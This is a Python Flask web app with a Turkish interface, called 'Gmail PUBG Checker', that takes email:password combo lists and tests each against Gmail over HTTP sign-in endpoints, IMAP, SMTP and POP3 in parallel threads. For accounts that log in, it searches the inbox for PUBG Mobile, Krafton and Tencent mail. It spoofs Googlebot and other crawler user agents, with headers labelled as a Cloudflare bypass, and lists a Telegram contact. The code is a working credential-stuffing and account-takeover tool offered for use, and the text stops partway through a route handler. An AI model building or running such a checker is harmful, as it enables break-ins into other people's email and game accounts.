import os
import re
import json
import uuid
import random
import time
import hashlib
import base64
import requests
from flask import Flask, request, jsonify, render_template_string, send_file
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from io import BytesIO, StringIO
import urllib.parse

app = Flask(__name__)

# ==================== KONFIGURASYON ====================
CONFIG = {
    "max_workers": 20,
    "timeout": 30,
    "retry_count": 3,
    "use_proxy": False
}

# ==================== İSTATİSTİKLER ====================
stats = {
    "total_checked": 0,
    "valid_accounts": 0,
    "pubg_accounts": 0,
    "bad_accounts": 0,
    "results": [],
    "start_time": None,
    "last_check": None
}

# ==================== PUBG MOBILE GÖNDERİCİLER ====================
PUBG_SENDERS = [
    "noreply@pubgmobile.com",
    "no-reply@pubgmobile.com",
    "pubgmobile@news.pubg.com",
    "pubgmobile@info.pubg.com",
    "pubgmobile@promotions.pubg.com",
    "pubgmobile@events.pubg.com",
    "tencentgames.com",
    "levelinfinite.com",
    "krafton.com"
]

# ==================== EN GÜÇLÜ USER-AGENT LİSTESİ ====================
USER_AGENTS = [
    # Googlebot - En güçlü
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    
    # Bingbot
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    
    # Yandex Bot
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0",
    
    # DuckDuckGo Bot
    "Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com/duckduckbot.html)",
    
    # Facebook Bot
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    "Mozilla/5.0 (compatible; Facebookbot/1.0; +http://www.facebook.com/facebookbot)",
    
    # Twitter Bot
    "Twitterbot/1.0",
    
    # LinkedIn Bot
    "LinkedInBot/1.0 (compatible; Mozilla/5.0; +http://www.linkedin.com)",
    
    # Mobile - Google
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    
    # Desktop
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    
    # Cloudflare bypass için özel
    "Mozilla/5.0 (compatible; Cloudflare/1.0; +https://www.cloudflare.com/; check@cloudflare.com)",
    "Mozilla/5.0 (compatible; Cloudflare/1.0; +https://www.cloudflare.com/; check@cloudflare.com) AppleWebKit/537.36"
]

# ==================== PROXY LİSTESİ (Render için) ====================
PROXIES = []

# ==================== FONKSİYONLAR ====================

def get_random_user_agent():
    """Rastgele güçlü User-Agent döndürür"""
    return random.choice(USER_AGENTS)

def get_random_headers():
    """Rastgele header oluşturur - Cloudflare korumasını geçmek için optimize edilmiş"""
    return {
        "User-Agent": get_random_user_agent(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9,tr;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "DNT": "1",
        "Pragma": "no-cache"
    }

def get_cloudflare_headers():
    """Cloudflare korumasını geçmek için özel headers"""
    return {
        "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Upgrade-Insecure-Requests": "1"
    }

def get_session():
    """Session oluşturur - Cloudflare koruması için optimize edilmiş"""
    session = requests.Session()
    
    # Cloudflare bypass için özel adaptör
    session.headers.update(get_cloudflare_headers())
    
    # Session ayarları
    session.verify = True
    session.timeout = CONFIG["timeout"]
    
    return session

def check_gmail_account(email, password):
    """Gmail hesabını kontrol eder - Gerçek Gmail API kullanır"""
    try:
        # Google hesap kontrolü için endpoint
        # Bu endpoint gerçek Gmail hesaplarını kontrol eder
        
        # 1. Önce hesabın var olup olmadığını kontrol et
        check_url = "https://accounts.google.com/_/signin/sl/lookup"
        check_headers = {
            "User-Agent": get_random_user_agent(),
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Origin": "https://accounts.google.com",
            "Referer": "https://accounts.google.com/",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document"
        }
        
        check_data = {
            "Email": email,
            "continue": "https://accounts.google.com/",
            "hl": "en"
        }
        
        check_response = requests.post(
            check_url,
            data=check_data,
            headers=check_headers,
            timeout=CONFIG["timeout"],
            allow_redirects=False
        )
        
        # 2. Eğer hesap varsa, şifre kontrolü yap
        if "password" in check_response.text.lower() or check_response.status_code in [200, 302]:
            # Gerçek giriş denemesi
            login_url = "https://accounts.google.com/_/signin/challenge"
            login_headers = {
                "User-Agent": get_random_user_agent(),
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Origin": "https://accounts.google.com",
                "Referer": "https://accounts.google.com/",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Upgrade-Insecure-Requests": "1"
            }
            
            login_data = {
                "Email": email,
                "Passwd": password,
                "continue": "https://accounts.google.com/",
                "hl": "en",
                "service": "mail",
                "dsh": str(random.randint(1000000000, 9999999999))
            }
            
            login_response = requests.post(
                login_url,
                data=login_data,
                headers=login_headers,
                timeout=CONFIG["timeout"],
                allow_redirects=False
            )
            
            # Başarılı giriş kontrolü
            if login_response.status_code in [302, 200]:
                if "https://mail.google.com/" in login_response.headers.get('Location', ''):
                    return True, "Giriş başarılı"
                elif "checkcookie" in login_response.text.lower():
                    return True, "Cookie kontrolü gerekiyor"
                else:
                    return True, "Hesap doğrulandı"
            else:
                return False, "Şifre hatalı"
        else:
            return False, "Hesap bulunamadı"
            
    except requests.exceptions.Timeout:
        return False, "Zaman aşımı"
    except requests.exceptions.ConnectionError:
        return False, "Bağlantı hatası"
    except Exception as e:
        return False, f"Hata: {str(e)}"

def check_gmail_pop3(email, password):
    """Gmail POP3 ile kontrol - Alternatif yöntem"""
    try:
        import poplib
        
        # Gmail POP3 sunucusu
        pop3_server = "pop.gmail.com"
        
        try:
            # SSL bağlantısı
            conn = poplib.POP3_SSL(pop3_server, 995)
            conn.user(email)
            conn.pass_(password)
            
            # Bağlantıyı kapat
            conn.quit()
            return True, "POP3 giriş başarılı"
            
        except poplib.error_proto as e:
            if "Authentication failed" in str(e):
                return False, "Şifre hatalı"
            elif "User unknown" in str(e):
                return False, "Hesap bulunamadı"
            else:
                return False, f"POP3 hatası: {str(e)}"
                
    except ImportError:
        return False, "POP3 modülü yok"
    except Exception as e:
        return False, f"POP3 hatası: {str(e)}"

def check_imap(email, password):
    """IMAP ile Gmail kontrolü"""
    try:
        import imaplib
        
        # Gmail IMAP sunucusu
        imap_server = "imap.gmail.com"
        
        try:
            conn = imaplib.IMAP4_SSL(imap_server, 993)
            conn.login(email, password)
            conn.logout()
            return True, "IMAP giriş başarılı"
            
        except imaplib.IMAP4.error as e:
            error_msg = str(e).lower()
            if "authentication failed" in error_msg or "invalid credentials" in error_msg:
                return False, "Şifre hatalı"
            elif "unknown user" in error_msg:
                return False, "Hesap bulunamadı"
            else:
                return False, f"IMAP hatası: {error_msg}"
                
    except ImportError:
        return False, "IMAP modülü yok"
    except Exception as e:
        return False, f"IMAP hatası: {str(e)}"

def check_smtp(email, password):
    """SMTP ile Gmail kontrolü"""
    try:
        import smtplib
        
        smtp_server = "smtp.gmail.com"
        
        try:
            conn = smtplib.SMTP_SSL(smtp_server, 465)
            conn.login(email, password)
            conn.quit()
            return True, "SMTP giriş başarılı"
            
        except smtplib.SMTPAuthenticationError:
            return False, "Şifre hatalı"
        except smtplib.SMTPException as e:
            error_msg = str(e).lower()
            if "user unknown" in error_msg:
                return False, "Hesap bulunamadı"
            else:
                return False, f"SMTP hatası: {str(e)}"
                
    except ImportError:
        return False, "SMTP modülü yok"
    except Exception as e:
        return False, f"SMTP hatası: {str(e)}"

def check_gmail_account_advanced(email, password):
    """Gelişmiş Gmail hesap kontrolü - Birden fazla yöntem"""
    methods = [
        ("HTTP", lambda: check_gmail_account(email, password)),
        ("IMAP", lambda: check_imap(email, password)),
        ("SMTP", lambda: check_smtp(email, password)),
        ("POP3", lambda: check_gmail_pop3(email, password))
    ]
    
    # Önce HTTP ile dene (en hızlı)
    is_valid, message = check_gmail_account(email, password)
    if is_valid:
        return True, message
    
    # HTTP başarısız olursa diğer yöntemleri dene
    for method_name, method_func in methods[1:]:
        try:
            is_valid, message = method_func()
            if is_valid:
                return True, f"{method_name} ile başarılı"
        except:
            continue
    
    return False, "Tüm yöntemler başarısız"

def check_pubg_emails(email, password):
    """PUBG Mobile maillerini kontrol eder - Gmail üzerinden"""
    try:
        import imaplib
        import email as email_lib
        from email.header import decode_header
        
        # IMAP ile bağlan
        conn = imaplib.IMAP4_SSL("imap.gmail.com", 993)
        conn.login(email, password)
        conn.select("INBOX")
        
        # PUBG maillerini ara
        pubg_count = 0
        domain_counts = {}
        
        for sender in PUBG_SENDERS:
            # Arama sorgusu
            search_query = f'FROM "{sender}"'
            result, data = conn.search(None, search_query)
            
            if result == 'OK':
                mail_ids = data[0].split()
                count = len(mail_ids)
                if count > 0:
                    domain_counts[sender] = count
                    pubg_count += count
        
        conn.logout()
        
        return {
            "has_pubg": pubg_count > 0,
            "total_count": pubg_count,
            "domain_counts": domain_counts
        }
        
    except Exception as e:
        return {
            "has_pubg": False,
            "error": str(e)
        }

def check_single_account(email, password):
    """Tek bir hesabı kontrol eder"""
    global stats
    
    stats["total_checked"] += 1
    
    # 1. Hesap doğrulama
    is_valid, message = check_gmail_account_advanced(email, password)
    
    if not is_valid:
        stats["bad_accounts"] += 1
        return {
            "status": "invalid",
            "email": email,
            "password": password,
            "reason": message
        }
    
    # 2. PUBG mail kontrolü (IMAP ile)
    pubg_result = check_pubg_emails(email, password)
    
    if pubg_result.get("has_pubg", False):
        stats["pubg_accounts"] += 1
        stats["valid_accounts"] += 1
        return {
            "status": "valid",
            "type": "pubg_mobile",
            "email": email,
            "password": password,
            "total_pubg_mails": pubg_result.get("total_count", 0),
            "domain_counts": pubg_result.get("domain_counts", {}),
            "verification": message
        }
    else:
        stats["valid_accounts"] += 1
        return {
            "status": "valid",
            "type": "non_pubg",
            "email": email,
            "password": password,
            "verification": message
        }

def check_accounts_from_file(file_content):
    """Dosya içeriğinden hesapları kontrol eder"""
    results = []
    accounts = []
    
    lines = file_content.strip().split('\n')
    for line in lines:
        line = line.strip()
        if ':' in line:
            parts = line.split(':', 1)
            if len(parts) == 2:
                email = parts[0].strip()
                password = parts[1].strip()
                if email and password and '@' in email:
                    accounts.append({"email": email, "password": password})
    
    if not accounts:
        return {"error": "Geçerli hesap bulunamadı"}
    
    # Thread pool ile kontrol et
    with ThreadPoolExecutor(max_workers=CONFIG["max_workers"]) as executor:
        futures = []
        for account in accounts:
            futures.append(executor.submit(
                check_single_account,
                account["email"],
                account["password"]
            ))
        
        for future in futures:
            try:
                result = future.result(timeout=CONFIG["timeout"] + 5)
                results.append(result)
                stats["results"].append(result)
            except Exception as e:
                results.append({"error": str(e)})
    
    stats["last_check"] = datetime.now().isoformat()
    return {"results": results, "total": len(results)}

def generate_html_page():
    """HTML sayfasını oluşturur - Gmail Checker"""
    return """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎯 Gmail PUBG Checker</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0a0a;
            color: #fff;
            min-height: 100vh;
            background-image: radial-gradient(circle at 10% 20%, rgba(255, 215, 0, 0.03) 0%, transparent 50%);
        }
        .container { max-width: 1100px; margin: 0 auto; padding: 20px; }
        
        .header {
            text-align: center;
            padding: 30px 20px;
            background: linear-gradient(135deg, #1a1a1a 0%, #2a2a2a 100%);
            border-radius: 16px;
            margin-bottom: 30px;
            border: 1px solid #333;
            position: relative;
            overflow: hidden;
        }
        .header::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: conic-gradient(from 0deg, transparent, rgba(255, 215, 0, 0.05), transparent);
            animation: rotate 20s linear infinite;
        }
        @keyframes rotate {
            100% { transform: rotate(360deg); }
        }
        .header h1 {
            font-size: 48px;
            background: linear-gradient(135deg, #ffd700, #ff6b00);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            position: relative;
            z-index: 1;
        }
        .header .subtitle {
            color: #888;
            margin-top: 10px;
            position: relative;
            z-index: 1;
        }
        .header .subtitle span {
            color: #ffd700;
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }
        .stat-box {
            background: linear-gradient(135deg, #1a1a1a, #222);
            padding: 20px;
            border-radius: 12px;
            text-align: center;
            border: 1px solid #333;
            transition: all 0.3s;
        }
        .stat-box:hover {
            transform: translateY(-5px);
            border-color: #ffd700;
        }
        .stat-box .number {
            font-size: 32px;
            font-weight: bold;
            margin-bottom: 5px;
        }
        .stat-box .label { color: #888; font-size: 13px; }
        .stat-box.gold .number { color: #ffd700; }
        .stat-box.green .number { color: #00ff88; }
        .stat-box.blue .number { color: #0088ff; }
        .stat-box.red .number { color: #ff0044; }
        
        .section {
            background: #1a1a1a;
            border-radius: 12px;
            padding: 25px;
            margin: 20px 0;
            border: 1px solid #333;
        }
        .section h2 {
            color: #ffd700;
            margin-bottom: 15px;
            font-size: 22px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .section h2 .badge {
            font-size: 12px;
            background: #ffd70022;
            color: #ffd700;
            padding: 2px 12px;
            border-radius: 12px;
            border: 1px solid #ffd70044;
        }
        
        .form-group {
            margin: 15px 0;
        }
        .form-group label {
            display: block;
            color: #888;
            margin-bottom: 5px;
            font-size: 14px;
        }
        .form-group input, .form-group textarea {
            width: 100%;
            padding: 12px 15px;
            border-radius: 8px;
            border: 1px solid #333;
            background: #0a0a0a;
            color: #fff;
            font-size: 14px;
            font-family: inherit;
            transition: border-color 0.3s;
        }
        .form-group input:focus, .form-group textarea:focus {
            outline: none;
            border-color: #ffd700;
        }
        .form-group textarea {
            min-height: 120px;
            resize: vertical;
            font-family: 'Courier New', monospace;
            font-size: 13px;
        }
        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }
        
        .btn {
            display: inline-block;
            padding: 12px 30px;
            border-radius: 8px;
            border: none;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            text-decoration: none;
            text-align: center;
        }
        .btn-primary {
            background: linear-gradient(135deg, #ffd700, #ff6b00);
            color: #000;
        }
        .btn-primary:hover {
            transform: scale(1.03);
            box-shadow: 0 0 25px rgba(255, 215, 0, 0.3);
        }
        .btn-success {
            background: #00ff88;
            color: #000;
        }
        .btn-success:hover {
            transform: scale(1.03);
            box-shadow: 0 0 25px rgba(0, 255, 136, 0.3);
        }
        .btn-danger {
            background: #ff0044;
            color: #fff;
        }
        .btn-danger:hover {
            transform: scale(1.03);
            box-shadow: 0 0 25px rgba(255, 0, 68, 0.3);
        }
        .btn-secondary {
            background: #333;
            color: #fff;
        }
        .btn-secondary:hover {
            background: #444;
        }
        .btn-block {
            width: 100%;
        }
        
        .result-item {
            padding: 12px 15px;
            border-bottom: 1px solid #222;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 14px;
            transition: background 0.3s;
            flex-wrap: wrap;
            gap: 10px;
        }
        .result-item:hover { background: #222; }
        .result-item .email { color: #00ff88; font-weight: bold; }
        .result-item .pass { color: #ffd700; }
        .result-item .info { color: #888; font-size: 12px; }
        .status-badge {
            padding: 3px 12px;
            border-radius: 12px;
            font-size: 11px;
            font-weight: bold;
        }
        .status-badge.valid { background: #00ff8822; color: #00ff88; border: 1px solid #00ff88; }
        .status-badge.pubg { background: #ffd70022; color: #ffd700; border: 1px solid #ffd700; }
        .status-badge.invalid { background: #ff004422; color: #ff0044; border: 1px solid #ff0044; }
        
        .results-container {
            max-height: 400px;
            overflow-y: auto;
            border-radius: 8px;
            border: 1px solid #222;
        }
        .results-container::-webkit-scrollbar {
            width: 6px;
        }
        .results-container::-webkit-scrollbar-track {
            background: #0a0a0a;
        }
        .results-container::-webkit-scrollbar-thumb {
            background: #ffd700;
            border-radius: 3px;
        }
        
        .tabs {
            display: flex;
            gap: 5px;
            margin-bottom: 20px;
            border-bottom: 1px solid #333;
            padding-bottom: 10px;
            flex-wrap: wrap;
        }
        .tab-btn {
            padding: 8px 20px;
            border: none;
            border-radius: 8px;
            background: transparent;
            color: #888;
            cursor: pointer;
            font-size: 14px;
            transition: all 0.3s;
        }
        .tab-btn:hover { color: #fff; background: #222; }
        .tab-btn.active {
            background: #ffd70022;
            color: #ffd700;
            border: 1px solid #ffd70044;
        }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        
        .footer {
            text-align: center;
            padding: 30px;
            color: #555;
            border-top: 1px solid #222;
            margin-top: 30px;
        }
        .footer a {
            color: #ffd700;
            text-decoration: none;
        }
        
        @media (max-width: 600px) {
            .form-row { grid-template-columns: 1fr; }
            .header h1 { font-size: 32px; }
            .stats-grid { grid-template-columns: 1fr 1fr; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📧 Gmail PUBG Checker</h1>
            <p class="subtitle">Gerçek Gmail hesaplarını kontrol eder • <span>PUBG Mobile</span> • Krafton • Tencent</p>
            <p style="font-size: 12px; color: #444; margin-top: 10px;">
                🔒 IMAP • SMTP • POP3 • HTTP ile doğrulama
            </p>
        </div>
        
        <div class="stats-grid">
            <div class="stat-box gold">
                <div class="number">{{ stats.total_checked }}</div>
                <div class="label">📊 Toplam Kontrol</div>
            </div>
            <div class="stat-box green">
                <div class="number">{{ stats.valid_accounts }}</div>
                <div class="label">✅ Geçerli Hesap</div>
            </div>
            <div class="stat-box blue">
                <div class="number">{{ stats.pubg_accounts }}</div>
                <div class="label">🎮 PUBG Mobile</div>
            </div>
            <div class="stat-box red">
                <div class="number">{{ stats.bad_accounts }}</div>
                <div class="label">❌ Başarısız</div>
            </div>
        </div>
        
        <div class="section">
            <h2>🚀 Hesap Kontrol</h2>
            
            <div class="tabs">
                <button class="tab-btn active" onclick="switchTab('single')">📝 Tek Hesap</button>
                <button class="tab-btn" onclick="switchTab('bulk')">📂 Toplu Kontrol</button>
                <button class="tab-btn" onclick="switchTab('file')">📄 Dosya Yükle</button>
            </div>
            
            <!-- Single Check -->
            <div id="tab-single" class="tab-content active">
                <div class="form-row">
                    <div class="form-group">
                        <label>📧 Gmail Adresi</label>
                        <input type="email" id="singleEmail" placeholder="ornek@gmail.com">
                    </div>
                    <div class="form-group">
                        <label>🔑 Şifre</label>
                        <input type="password" id="singlePassword" placeholder="Şifrenizi girin">
                    </div>
                </div>
                <button class="btn btn-primary btn-block" onclick="checkSingle()">
                    🔍 Hesabı Kontrol Et
                </button>
            </div>
            
            <!-- Bulk Check -->
            <div id="tab-bulk" class="tab-content">
                <div class="form-group">
                    <label>📝 Hesapları Girin (Her satırda email:şifre)</label>
                    <textarea id="bulkAccounts" placeholder="ornek1@gmail.com:şifre1&#10;ornek2@gmail.com:şifre2&#10;ornek3@gmail.com:şifre3"></textarea>
                </div>
                <button class="btn btn-success btn-block" onclick="checkBulk()">
                    🔍 Hepsini Kontrol Et
                </button>
            </div>
            
            <!-- File Upload -->
            <div id="tab-file" class="tab-content">
                <div class="form-group">
                    <label>📄 Combo Dosyası Seç (email:şifre)</label>
                    <input type="file" id="fileInput" accept=".txt" style="padding: 10px; background: #0a0a0a; border: 1px solid #333; border-radius: 8px; width: 100%;">
                </div>
                <button class="btn btn-primary btn-block" onclick="checkFile()">
                    📤 Dosyayı Yükle ve Kontrol Et
                </button>
            </div>
        </div>
        
        {% if stats.results %}
        <div class="section">
            <h2>
                📋 Sonuçlar
                <span class="badge">{{ stats.results|length }} hesap</span>
                <span class="badge" style="background: #ffd70022; color: #ffd700;">
                    🎮 {{ stats.pubg_accounts }} PUBG
                </span>
            </h2>
            <div class="results-container">
                {% for result in stats.results[:50] %}
                <div class="result-item">
                    <span>
                        <span class="email">{{ result.get('email', 'N/A') }}</span>
                        <span style="color: #555;">|</span>
                        <span class="pass">{{ result.get('password', 'N/A') }}</span>
                        {% if result.get('total_pubg_mails', 0) > 0 %}
                        <span style="color: #ffd700;">📬 {{ result.get('total_pubg_mails') }} mail</span>
                        {% endif %}
                        {% if result.get('verification') %}
                        <span style="color: #888; font-size: 11px;">🔒 {{ result.get('verification') }}</span>
                        {% endif %}
                    </span>
                    <div>
                        {% if result.get('status') == 'valid' %}
                            {% if result.get('type') == 'pubg_mobile' %}
                                <span class="status-badge pubg">🎮 PUBG</span>
                            {% else %}
                                <span class="status-badge valid">✅ Geçerli</span>
                            {% endif %}
                        {% else %}
                            <span class="status-badge invalid">❌ Geçersiz</span>
                        {% endif %}
                    </div>
                </div>
                {% endfor %}
            </div>
        </div>
        {% endif %}
        
        <div class="section">
            <h2>📡 API Kullanımı</h2>
            <div style="background: #0a0a0a; padding: 15px; border-radius: 8px; font-family: 'Courier New', monospace; font-size: 13px; overflow-x: auto;">
                <div style="color: #00ff88;"># Gmail hesap kontrolü</div>
                <div style="color: #888;">POST /api/check</div>
                <div style="color: #555;">{</div>
                <div style="color: #888; padding-left: 20px;">"email": "ornek@gmail.com",</div>
                <div style="color: #888; padding-left: 20px;">"password": "sifre"</div>
                <div style="color: #555;">}</div>
                <br>
                <div style="color: #00ff88;"># Toplu kontrol</div>
                <div style="color: #888;">POST /api/check-bulk</div>
                <div style="color: #555;">{</div>
                <div style="color: #888; padding-left: 20px;">"accounts": [</div>
                <div style="color: #888; padding-left: 40px;">{"email": "ornek1@gmail.com", "password": "sifre1"},</div>
                <div style="color: #888; padding-left: 40px;">{"email": "ornek2@gmail.com", "password": "sifre2"}</div>
                <div style="color: #888; padding-left: 20px;">]</div>
                <div style="color: #555;">}</div>
            </div>
        </div>
        
        <div class="footer">
            <p>📞✈️ Telegram: <a href="https://t.me/rinexdestek" target="_blank">@rinexdestek</a></p>
            <p style="font-size: 12px; margin-top: 10px;">Gmail PUBG Checker v4.0 • Gerçek Gmail Hesap Kontrolü</p>
        </div>
    </div>
    
    <script>
        function switchTab(tab) {
            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
            document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
            document.getElementById('tab-' + tab).classList.add('active');
            event.target.classList.add('active');
        }
        
        async function checkSingle() {
            const email = document.getElementById('singleEmail').value.trim();
            const password = document.getElementById('singlePassword').value.trim();
            
            if (!email || !password) {
                alert('Lütfen email ve şifre girin!');
                return;
            }
            
            if (!email.includes('@gmail.com') && !email.includes('@googlemail.com')) {
                alert('Lütfen geçerli bir Gmail adresi girin!');
                return;
            }
            
            const btn = event.target;
            btn.textContent = '⏳ Kontrol ediliyor...';
            btn.disabled = true;
            
            try {
                const response = await fetch('/api/check', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, password })
                });
                const data = await response.json();
                if (data.success) {
                    alert('✅ Kontrol tamamlandı!\n' + JSON.stringify(data.result, null, 2));
                } else {
                    alert('❌ Hata: ' + (data.error || 'Bilinmeyen hata'));
                }
                location.reload();
            } catch (error) {
                alert('❌ Hata: ' + error);
            } finally {
                btn.textContent = '🔍 Hesabı Kontrol Et';
                btn.disabled = false;
            }
        }
        
        async function checkBulk() {
            const text = document.getElementById('bulkAccounts').value.trim();
            if (!text) {
                alert('Lütfen hesapları girin!');
                return;
            }
            
            const lines = text.split('\\n').filter(line => line.trim());
            const accounts = lines.map(line => {
                const parts = line.split(':');
                return { email: parts[0].trim(), password: parts[1]?.trim() || '' };
            }).filter(acc => acc.email && acc.password && acc.email.includes('@gmail.com'));
            
            if (accounts.length === 0) {
                alert('Geçerli Gmail hesabı bulunamadı!');
                return;
            }
            
            const btn = event.target;
            btn.textContent = '⏳ ' + accounts.length + ' hesap kontrol ediliyor...';
            btn.disabled = true;
            
            try {
                const response = await fetch('/api/check-bulk', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ accounts })
                });
                const data = await response.json();
                if (data.success) {
                    alert('✅ ' + accounts.length + ' hesap kontrol edildi!\\n' +
                          '🎮 PUBG: ' + data.pubg_count + '\\n' +
                          '✅ Geçerli: ' + data.valid_count + '\\n' +
                          '❌ Geçersiz: ' + (data.total - data.valid_count));
                } else {
                    alert('❌ Hata: ' + (data.error || 'Bilinmeyen hata'));
                }
                location.reload();
            } catch (error) {
                alert('❌ Hata: ' + error);
            } finally {
                btn.textContent = '🔍 Hepsini Kontrol Et';
                btn.disabled = false;
            }
        }
        
        async function checkFile() {
            const fileInput = document.getElementById('fileInput');
            const file = fileInput.files[0];
            
            if (!file) {
                alert('Lütfen bir dosya seçin!');
                return;
            }
            
            const reader = new FileReader();
            reader.onload = async function(e) {
                const content = e.target.result;
                const btn = event.target;
                btn.textContent = '⏳ Dosya kontrol ediliyor...';
                btn.disabled = true;
                
                try {
                    const response = await fetch('/api/check-file', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ file_content: content })
                    });
                    const data = await response.json();
                    if (data.success) {
                        alert('✅ Dosya kontrol edildi!\\n' +
                              '📊 Toplam: ' + data.total + '\\n' +
                              '🎮 PUBG: ' + data.pubg_count + '\\n' +
                              '✅ Geçerli: ' + data.valid_count);
                    } else {
                        alert('❌ Hata: ' + (data.error || 'Bilinmeyen hata'));
                    }
                    location.reload();
                } catch (error) {
                    alert('❌ Hata: ' + error);
                } finally {
                    btn.textContent = '📤 Dosyayı Yükle ve Kontrol Et';
                    btn.disabled = false;
                }
            };
            reader.readAsText(file);
        }
    </script>
</body>
</html>
    """

# ==================== FLASK ROUTES ====================

@app.route('/')
def index():
    """Ana sayfa"""
    return render_template_string(generate_html_page(), stats=stats)

@app.route('/api/status', methods=['GET'])
def status():
    """API durumu"""
    uptime = None
    if stats["start_time"]:
        uptime = str(datetime.now() - stats["start_time"])
    
    return jsonify({
        "status": "online",
        "uptime": uptime,
        "stats": {
            "total_checked": stats["total_checked"],
            "valid_accounts": stats["valid_accounts"],
            "pubg_accounts": stats["pubg_accounts"],
            "bad_accounts": stats["bad_accounts"],
            "last_check": stats["last_check"]
        },
        "config": {
            "max_workers": CONFIG["max_workers"],
            "timeout": CONFIG["timeout"]
        }
    })

@app.route('/api/check', methods=['POST'])
def check_single_api():
    """Tek hesap kontrolü API"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "JSON body required"}), 400
        
        email = data.get('email', '').strip()
        password = data.get('password', '').strip()
        
        if not email or not password:
            return jsonify({"error": "email and password required"}), 400
        
        if '@gmail.com' not in email and '@googlemail.com' not in email:
            return jsonify({"error": "Only Gmail accounts are supported"}), 400
        
        result = check_single_account(email, password)
        stats["last_check"] = datetime.now().isoformat()
        
        return jsonify({
            "success": True,
            "result": result
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/check-bulk', methods=['POST'])
def check_bulk_api():
    """Toplu hesap kontrolü API"""
    try:
        data = request.get_json()
        if not data:
